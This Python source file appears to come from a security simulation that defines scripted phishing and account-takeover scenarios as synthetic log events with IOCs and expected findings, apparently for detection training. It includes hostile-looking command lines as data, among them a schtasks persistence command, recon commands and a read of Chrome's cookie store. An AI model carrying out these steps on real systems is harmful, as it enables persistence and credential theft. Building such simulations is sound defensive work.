        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "https://company-my.sharepoint.com/personal/Documents/Projects/Strategic-Roadmap-2027.pptx", "system": "onedrive", "label": "confidential", "category": "strategic", "description": "Attacker downloaded strategic roadmap from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/Engineering", "success": True, "description": "Attacker browsed Engineering SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
    ],
    parameters=MICROSOFT_365_PHISHING_PARAMS,
    success_rate=0.6,
    iocs=["microsoft-365-login.com", "office365-security.net", "login-microsoft365.com"],
    expected_findings=["Phishing email impersonating Microsoft 365 security alert", "Unauthorized login from foreign IP with unknown device", "Inbox rule created to suppress security alerts", "Confidential documents downloaded from OneDrive and SharePoint"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "phishing_domain", "phishing_url", "attacker_ip"],
)

IT_SUPPORT_MALWARE = AttackScenario(
    id="it_support_malware",
    tier="T2",
    name="IT Support Impersonation Malware Delivery",
    description="Attacker impersonates IT support via email, convincing victim to download and execute malware disguised as a security update. Malware establishes C2 connection, creates persistence via scheduled task, runs host discovery commands, enumerates sensitive files, stages data for exfiltration, and exfiltrates collected data over the C2 channel.",
    attack_type="phishing",
    events=[
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "contains_url": "{download_url}", "metadata": {"is_malicious": True, "attack_phase": "delivery"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(15, 10, 2, 60), data={"app": "Microsoft Edge", "action": "download", "resource_name": "{malware_name}", "success": True, "description": "Downloaded executable from email link", "metadata": {"attack_phase": "delivery"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 30), "data": {"app": "Outlook", "action": "report_phishing", "description": "User reported suspicious email to security", "success": True}}),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 10), data={"process_name": "{malware_name}", "action": "start", "parent_process": "explorer.exe", "command_line": "C:\\Users\\Downloads\\{malware_name}", "path": "C:\\Users\\Downloads\\{malware_name}", "hash": "da6a213dd9edc30971960015c8ceb4a6cb72c29807e01252db7d276246ade0bf", "pid": 57089, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "execution"}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 2), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 512, "bytes_received": 2048, "description": "Outbound C2 connection to {c2_domain}", "metadata": {"attack_phase": "command_and_control", "c2_beacon": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(3, 2, 0.5, 10), data={"process_name": "schtasks.exe", "action": "start", "parent_process": "{malware_name}", "command_line": "schtasks.exe /create /tn \"SecurityUpdate\" /tr \"C:\\Users\\Downloads\\{malware_name}\" /sc onlogon /ru SYSTEM", "path": "C:\\Windows\\System32\\schtasks.exe", "hash": "37215e7a0b2445e8d981c82c471d94a23d94a732608831b2ebe970e0e82440e5", "pid": 49628, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "persistence", "scheduled_task": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.3, 5), data={"process_name": "whoami.exe", "action": "start", "parent_process": "{malware_name}", "command_line": "whoami /all", "path": "C:\\Windows\\System32\\whoami.exe", "hash": "96d81afb410fcc1ff999c142dc3983fe3baa0a328f2a764ca24f07e893b5114d", "pid": 47430, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "host_recon": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "ipconfig.exe", "action": "start", "parent_process": "{malware_name}", "command_line": "ipconfig /all", "path": "C:\\Windows\\System32\\ipconfig.exe", "hash": "377cab87d4d76324f330b3a107d61c69fc55b8c26189a42fd258502304aaf308", "pid": 29366, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "host_recon": True}}, requires_success=True),
        AttackEvent(event_type="process_event", delay=_delay(1, 0.5, 0.2, 3), data={"process_name": "net.exe", "action": "start", "parent_process": "{malware_name}", "command_line": "net view /domain", "path": "C:\\Windows\\System32\\net.exe", "hash": "72f73bcb8702fead75e5d95cf91295c4ceb2fd92306f4bb98c678f1a09ce25ad", "pid": 3069, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "discovery", "host_recon": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "read", "path": "C:\\Users\\Documents\\*.xlsx", "system": "endpoint", "description": "Malware enumerated spreadsheet files in Documents folder", "metadata": {"attack_phase": "collection", "file_enumeration": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 8), data={"action": "modify", "path": "C:\\Users\\AppData\\Local\\Temp\\staged_data.zip", "system": "endpoint", "description": "Malware staged collected data into compressed archive for exfiltration", "metadata": {"attack_phase": "exfiltration", "data_staging": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(8, 4, 2, 20), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 4194304, "bytes_received": 1024, "description": "Large outbound HTTPS transfer to C2 — exfiltration of staged data archive", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
    ],
    parameters=IT_SUPPORT_MALWARE_PARAMS,
    success_rate=0.5,
    iocs=["it-helpdesk-support.com", "cdn-static-assets.com"],
    expected_findings=["Malicious executable downloaded and executed from Downloads folder", "C2 connection established to suspicious domain", "Scheduled task created for persistence", "Data exfiltrated over C2 channel"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "c2_domain", "malware_name", "download_url", "attacker_ip"],
)

VOICEMAIL_PHISHING = AttackScenario(
    id="voicemail_phishing",
    tier="T2",
    name="Voicemail Notification MFA Capture",
    description="Attacker sends fake voicemail notification with HTML attachment. Opening the attachment presents a fake MFA page to capture session tokens. Attacker replays the stolen session from a foreign IP, searches mailbox for sensitive content, reads confidential emails, registers a new MFA device, creates inbox rules to suppress alerts, and accesses SharePoint documents.",
    attack_type="phishing",
    events=[
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "attachment_types": ["html"], "metadata": {"is_malicious": True, "attack_phase": "delivery", "attachment_is_malicious": True}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(10, 8, 1, 45), data={"app": "Microsoft Edge", "action": "open_local_file", "resource_name": "voicemail_message.html", "success": True, "description": "Opened HTML attachment in browser", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(5, 3, 1, 20), "data": {"app": "Outlook", "action": "delete_email", "description": "User deleted suspicious voicemail email", "success": True}}),
        AttackEvent(event_type="app_event", delay=_delay(1, 0.5, 0.2, 3), data={"app": "Microsoft Edge", "action": "form_submit", "resource_name": "{evilginx_domain}", "success": True, "description": "Submitted MFA credentials to phishing page", "metadata": {"attack_phase": "credential_capture"}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(5, 3, 1, 30), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Session Token", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR confidential OR wire transfer OR credentials OR bank'", "success": True, "description": "Attacker searched mailbox for sensitive keywords using stolen session", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: VPN Credentials — Updated for Remote Workers", "success": True, "description": "Attacker read email containing VPN credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Customer PII Data Access Request — Approved", "success": True, "description": "Attacker read email about approved PII data access", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="admin_action", delay=_delay(8, 4, 2, 20), data={"system": "azure_ad", "approved_by": "self", "action": "register_mfa_device", "resource_type": "authentication_method", "resource_id": "mfa_totp_authenticator", "resource_name": "Microsoft Authenticator", "success": True, "description": "New Authenticator app registered from attacker session for persistent access", "metadata": {"attack_phase": "persistence", "is_attacker": True, "mfa_manipulation": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_suppress_alerts", "resource_name": "Move Security Alerts to Deleted Items", "success": True, "description": "Inbox rule created to suppress security alert emails", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 25), data={"app": "SharePoint Online", "action": "navigate", "resource_type": "site", "resource_name": "https://company.sharepoint.com/sites/Operations", "success": True, "description": "Attacker browsed Operations SharePoint site", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 12), data={"action": "download", "path": "https://company.sharepoint.com/sites/Operations/Shared Documents/Customer-Database-Export.csv", "system": "sharepoint", "label": "confidential", "category": "pii", "description": "Attacker downloaded customer database export from SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
    ],
    parameters=VOICEMAIL_PHISHING_PARAMS,
    success_rate=0.55,
    iocs=["voicemail-notification.com", "login-secure-portal.com"],
    expected_findings=["Fake voicemail notification with malicious HTML attachment", "Session token replay from foreign IP", "New MFA device registered from attacker session", "SharePoint documents including customer PII downloaded"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "evilginx_domain", "attacker_ip"],
)

VENDOR_INVOICE_QR = AttackScenario(
    id="vendor_invoice_qr",
    tier="T2",
    name="Vendor Invoice QR Code Redirect",
    description="Attacker sends fake vendor invoice with PDF containing QR code. Scanning QR code on mobile device leads to credential harvesting page. After capturing credentials, attacker logs in from foreign IP and accesses the victim's mailbox to search for additional financial data.",
    attack_type="phishing",
    events=[
        # --- Phase 1: Delivery ---
        AttackEvent(event_type="email", delay=_delay(0, 0), data={"direction": "received", "from": "{attacker_email}", "subject": "{subject}", "content": "{email_body}", "external": True, "attachment_types": ["pdf"], "metadata": {"is_malicious": True, "attack_phase": "delivery", "contains_qr_code": True}}, requires_success=False),

        # --- Phase 2: Victim opens PDF ---
        AttackEvent(event_type="app_event", delay=_delay(20, 15, 3, 90), data={"app": "Adobe Acrobat", "action": "open_document", "resource_name": "Invoice_{invoice_number}.pdf", "success": True, "description": "Opened invoice PDF attachment", "metadata": {"attack_phase": "exploitation"}}, requires_success=True, on_failure={"event_type": "app_event", "delay": _delay(10, 5, 2, 30), "data": {"app": "Outlook", "action": "forward_email", "description": "User forwarded suspicious invoice to finance team", "success": True}}),

        # --- Phase 3: QR code scan ---
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 5), data={"app": "Mobile Device", "action": "qr_code_scan", "resource_name": "{phishing_url}", "success": True, "description": "QR code scanned from invoice PDF", "metadata": {"attack_phase": "exploitation"}}, requires_success=True),

        # --- Phase 4: Credential capture ---
        AttackEvent(event_type="app_event", delay=_delay(1.5, 0.5, 0.5, 4), data={"app": "Mobile Browser", "action": "form_submit", "resource_name": "{phishing_domain}", "success": True, "description": "Submitted payment credentials on mobile", "metadata": {"attack_phase": "credential_capture"}}, requires_success=True),

        # --- Phase 5: Attacker login with stolen credentials ---
        AttackEvent(event_type="login", delay=_delay(30, 20, 5, 120), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Post-login mailbox access ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'payment OR wire transfer OR bank account OR routing number'", "success": True, "description": "Attacker searched mailbox for payment-related information", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Read sensitive emails found in search ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: Wire Transfer Instructions — Vendor Payment Q4", "success": True, "description": "Attacker read email containing wire transfer details", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(2, 1, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: Bank Account Details — Updated Routing Number", "success": True, "description": "Attacker read email containing bank account routing details", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 8: Persistence — inbox forwarding rule ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward_invoices", "resource_name": "Auto-Forward Invoice Emails", "success": True, "description": "Inbox rule created to forward emails containing 'invoice' or 'payment' to external address", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),

        # --- Phase 9: Defense evasion — suppress security alerts ---
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_suppress_alerts", "resource_name": "Auto-Delete Security Alerts", "success": True, "description": "Inbox rule created to auto-delete emails containing 'unusual sign-in' or 'security alert'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 10: File access — download financial documents ---
        AttackEvent(event_type="file_event", delay=_delay(5, 3, 1, 15), data={"action": "download", "path": "/onedrive/Finance/Vendor_Payment_Schedule_2026.xlsx", "system": "onedrive", "label": "confidential", "category": "financial", "description": "Downloaded vendor payment schedule from OneDrive", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 11: Network indicator — sustained attacker session ---
        AttackEvent(event_type="network_event", delay=_delay(3, 2, 0.5, 10), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 262144, "bytes_received": 1048576, "description": "Sustained HTTPS session to M365 from foreign IP — mailbox and file access after QR phishing"}, requires_success=True),
    ],
    parameters=VENDOR_INVOICE_QR_PARAMS,
    success_rate=0.45,
    iocs=["vendor-payment-portal.com", "invoice-payment-center.net"],
    expected_findings=["Fake vendor invoice with malicious QR code", "Credentials captured via QR-linked phishing page", "Attacker login from foreign IP", "Inbox forwarding and security alert suppression rules created"],
    relevant_ioc_keys=["attacker_email", "attacker_domain", "phishing_domain", "phishing_url", "attacker_ip"],
)

# ---------------------------------------------------------------------------
# Account takeover scenario definitions
# ---------------------------------------------------------------------------

CREDENTIAL_STUFFING_IMPOSSIBLE_TRAVEL = AttackScenario(
    id="credential_stuffing_impossible_travel",
    tier="T2",
    name="Credential Stuffing with Impossible Travel",
    description="Attacker uses stolen credentials from data breach to attempt login across multiple rounds with cooldown periods. After succeeding via Evilginx session token replay, attacker logs in from geographically impossible location, sets up persistence, accesses mailbox and sensitive files, and exfiltrates data.",
    attack_type="account_takeover",
    events=[
        # Phase 1: Credential stuffing — first round of attempts
        AttackEvent(event_type="login", delay=_delay(0, 0), data={"success": False, "failure_reason": "invalid_password", "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access", "is_attacker": True}}, requires_success=False),
        AttackEvent(event_type="login", delay=_delay(0.5, 0.2, 0.1, 1), data={"success": False, "failure_reason": "invalid_password", "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access"}}, requires_success=False),
        AttackEvent(event_type="login", delay=_delay(0.5, 0.2, 0.1, 1), data={"success": False, "failure_reason": "invalid_password", "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access"}}, requires_success=False),
        # Cooldown — attacker waits to avoid lockout, tries again with different credentials
        AttackEvent(event_type="login", delay=_delay(30, 15, 10, 60), data={"success": False, "failure_reason": "invalid_password", "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access"}}, requires_success=False),
        AttackEvent(event_type="login", delay=_delay(0.5, 0.2, 0.1, 1), data={"success": False, "failure_reason": "invalid_password", "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Password", "metadata": {"attack_phase": "initial_access"}}, requires_success=False),
        # Phase 2: Evilginx phishing — attacker switches to session token capture
        AttackEvent(event_type="app_event", delay=_delay(45, 20, 10, 120), data={"app": "Microsoft Edge", "action": "navigate", "usage": "read", "resource_name": "{evilginx_domain}", "success": True, "description": "Victim directed to Evilginx phishing proxy via crafted link", "metadata": {"attack_phase": "credential_theft", "evilginx_proxy": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{attacker_ip}", "destination_ip": "10.0.2.10", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "inbound", "auth": "none", "bytes_sent": 4096, "bytes_received": 8192, "description": "Inbound HTTPS connection from attacker IP — session token intercepted", "metadata": {"attack_phase": "credential_theft", "is_attacker": True}}, requires_success=True, pre_attempts={"count_range": [2, 5], "delay": _delay(0.2, 0.1, 0.05, 0.5), "data_overrides": {"action": "blocked", "description": "Inbound HTTPS connection attempt — blocked by WAF"}}),
        # Phase 3: Session replay — impossible travel login
        AttackEvent(event_type="login", delay=_delay(10, 5, 2, 30), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Session Token", "metadata": {"attack_phase": "credential_theft", "is_attacker": True, "via_evilginx": True, "impossible_travel": True}}, requires_success=True),
        # Phase 4: Persistence setup
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook", "action": "create_forwarding_rule", "usage": "admin", "resource_name": "inbox", "success": True, "description": "Created inbox forwarding rule to external address", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Microsoft 365", "action": "register_app", "usage": "admin", "resource_type": "oauth", "resource_name": "OAuth App - Data Sync", "success": True, "description": "Registered OAuth app for persistent API access", "metadata": {"attack_phase": "persistence", "is_attacker": True}}, requires_success=True),
        # Phase 5: Mailbox and data access
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook", "action": "search_mailbox", "usage": "read", "resource_name": "inbox", "success": True, "description": "Searched mailbox for password reset and financial keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 10), data={"app": "Outlook", "action": "read_message", "usage": "read", "resource_name": "inbox", "success": True, "description": "Read emails containing VPN credentials and internal system URLs", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(8, 4, 2, 20), data={"action": "read", "path": "/sharepoint/Finance/annual_budget.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Accessed confidential annual budget spreadsheet", "metadata": {"attack_phase": "collection"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/Finance/vendor_payments.csv", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Downloaded vendor payment records", "metadata": {"attack_phase": "exfiltration"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(3, 2, 0.5, 10), data={"action": "download", "path": "/sharepoint/HR/employee_directory_full.xlsx", "system": "sharepoint", "label": "confidential", "category": "pii", "description": "Downloaded full employee directory with PII", "metadata": {"attack_phase": "exfiltration"}}, requires_success=True),
    ],
    parameters=CREDENTIAL_STUFFING_PARAMS,
    success_rate=0.3,
    iocs=["login-secure-portal.com"],
    expected_findings=["Multiple failed login attempts with cooldown pattern", "Impossible travel — session token replay from foreign geo", "Inbox forwarding rule and OAuth app registered for persistence", "Confidential financial and PII documents downloaded"],
    relevant_ioc_keys=["attacker_ip", "evilginx_domain"],
)

MFA_FATIGUE_PUSH_BOMBING = AttackScenario(
    id="mfa_fatigue_push_bombing",
    tier="T2",
    name="MFA Fatigue Push Bombing Attack",
    description="Attacker sends dozens of MFA push notifications to overwhelm the user. Exhausted user accidentally approves one, allowing attacker to log in, register a new device, access the victim's mailbox, create an inbox rule for persistence, and generate suspicious network traffic from the foreign IP.",
    attack_type="account_takeover",
    events=[
        # --- Phase 1: Push flood (pre_attempts generate 35-55 failed pushes) ---
        AttackEvent(event_type="mfa_event", delay=_delay(0, 0), data={"action": "push_sent", "method": "push", "app": "Okta Verify", "ip": "{attacker_ip}", "metadata": {"attack_phase": "mfa_fatigue", "is_push_bombing": True}}, requires_success=False, pre_attempts={"count_range": [35, 55], "delay": {"mean": 0.3, "std": 0.2, "min": 0.1, "max": 1.0}, "data_overrides": {"success": False, "metadata": {"attack_phase": "mfa_fatigue", "is_push_bombing": True}}}),

        # --- Phase 2: Accidental approval ---
        AttackEvent(event_type="mfa_event", delay=_delay(30, 15, 5, 120), data={"action": "push_approved", "method": "push", "device_name": "iPhone (Personal)", "app": "Okta Verify", "success": True, "metadata": {"attack_phase": "mfa_bypass", "accidental_approval": True}}, requires_success=True, on_failure={"event_type": "mfa_event", "delay": _delay(60, 30, 10, 180), "data": {"action": "push_denied", "method": "push", "device_name": "iPhone (Personal)", "app": "Okta Verify", "metadata": {"user_blocked_attack": True}}}),

        # --- Phase 3: Attacker login ---
        AttackEvent(event_type="login", delay=_delay(0.5, 0.2, 0.1, 2), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "SSO+MFA", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True}}, requires_success=True),

        # --- Phase 4: Register attacker MFA device ---
        AttackEvent(event_type="mfa_event", delay=_delay(3, 2, 0.5, 10), data={"action": "device_registered", "device_name": "{attacker_device}", "method": "push", "app": "Okta Verify", "metadata": {"attack_phase": "persistence", "is_attacker_device": True}}, requires_success=True),

        # --- Phase 5: Post-login mailbox access and search ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR confidential OR SSN OR bank account'", "success": True, "description": "Attacker searched mailbox for sensitive keywords after MFA bypass", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),

        # --- Phase 6: Inbox rule for persistence ---
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_delete_alerts", "resource_name": "Auto-Delete Security Alerts", "success": True, "description": "Inbox rule created to auto-delete emails containing 'security alert' or 'unusual sign-in'", "metadata": {"attack_phase": "defense_evasion", "is_attacker": True}}, requires_success=True),

        # --- Phase 7: Network indicator ---
        AttackEvent(event_type="network_event", delay=_delay(2, 1, 0.5, 8), data={"source_ip": "{attacker_ip}", "destination_ip": "52.96.0.40", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "user": "{victim_username}", "auth": "none", "bytes_sent": 262144, "bytes_received": 1048576, "description": "Sustained HTTPS session to M365 from foreign IP after MFA fatigue bypass"}, requires_success=True),
    ],
    parameters=MFA_FATIGUE_PARAMS,
    success_rate=0.4,
    iocs=[],
    expected_findings=["Large number of MFA push notifications (push bombing)", "Suspicious MFA approval after repeated denials", "Login from unknown device immediately after approval", "New MFA device registered from suspicious location"],
    relevant_ioc_keys=["attacker_ip"],
)

SESSION_HIJACKING_TOKEN_THEFT = AttackScenario(
    id="session_hijacking_token_theft",
    tier="T2",
    name="Session Hijacking via Token Theft",
    description="Malware extracts session tokens from victim's browser. Attacker uses stolen tokens to replay sessions and access corporate resources without credentials or MFA. After logging in, the attacker accesses the mailbox, searches for sensitive keywords, reads confidential emails, creates an inbox forwarding rule for persistent access, downloads documents from SharePoint, and generates network indicators.",
    attack_type="account_takeover",
    events=[
        AttackEvent(event_type="process_event", delay=_delay(0, 0), data={"process_name": "{token_stealer_name}", "action": "start", "parent_process": "svchost.exe", "command_line": "{token_stealer_name} --extract-tokens", "path": "C:\\ProgramData\\{token_stealer_name}", "hash": "7b9ab51765cdbb41bc7bd8a7e06f833df3b4900a08188ad3d126c89ed56b87b9", "pid": 972, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "credential_access", "is_malware": True}}, requires_success=False),
        AttackEvent(event_type="file_event", delay=_delay(1, 0.5, 0.2, 3), data={"action": "read", "path": "C:\\Users\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", "system": "endpoint", "metadata": {"attack_phase": "credential_access", "extracting_tokens": True}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.1, 0.05, 0.01, 0.5), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 16384, "bytes_received": 512, "description": "Outbound HTTPS exfiltration of session tokens to C2", "metadata": {"attack_phase": "exfiltration", "c2_exfil": True}}, requires_success=True),
        AttackEvent(event_type="login", delay=_delay(15, 10, 2, 60), data={"success": True, "ip": "{attacker_ip}", "geo": "{attacker_geo}", "device_id": "unknown", "known_device": False, "user_agent": "{attacker_user_agent}", "method": "Session Token", "metadata": {"attack_phase": "unauthorized_access", "is_attacker": True, "session_replay": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Outlook Web Access", "action": "access_mailbox", "resource_type": "mailbox", "resource_name": "Inbox", "success": True, "description": "Attacker accessed mailbox using replayed session token", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Outlook Web Access", "action": "search_mailbox", "resource_type": "mailbox", "resource_name": "Inbox Search: 'password OR credentials OR API key OR secret OR financial OR bank account'", "success": True, "description": "Attacker searched mailbox for sensitive keywords", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 12), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "Re: Production Database Credentials — Rotation Complete", "success": True, "description": "Attacker read email containing production database credentials", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Outlook Web Access", "action": "read_email", "resource_type": "email", "resource_name": "FW: M&A Target List — Board Eyes Only", "success": True, "description": "Attacker read highly confidential M&A target list email", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(8, 4, 2, 20), data={"app": "Exchange Online", "action": "create_inbox_rule", "resource_type": "inbox_rule", "resource_id": "rule_auto_forward", "resource_name": "Auto-Forward to External", "success": True, "description": "Inbox forwarding rule created to external address for persistent email monitoring", "metadata": {"attack_phase": "persistence", "is_attacker": True, "external_forwarding": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(10, 5, 2, 25), data={"action": "download", "path": "https://company.sharepoint.com/sites/Finance/Shared Documents/Annual-Budget-FY2027.xlsx", "system": "sharepoint", "label": "confidential", "category": "financial", "description": "Attacker downloaded annual budget from Finance SharePoint", "metadata": {"attack_phase": "collection", "is_attacker": True}}, requires_success=True),
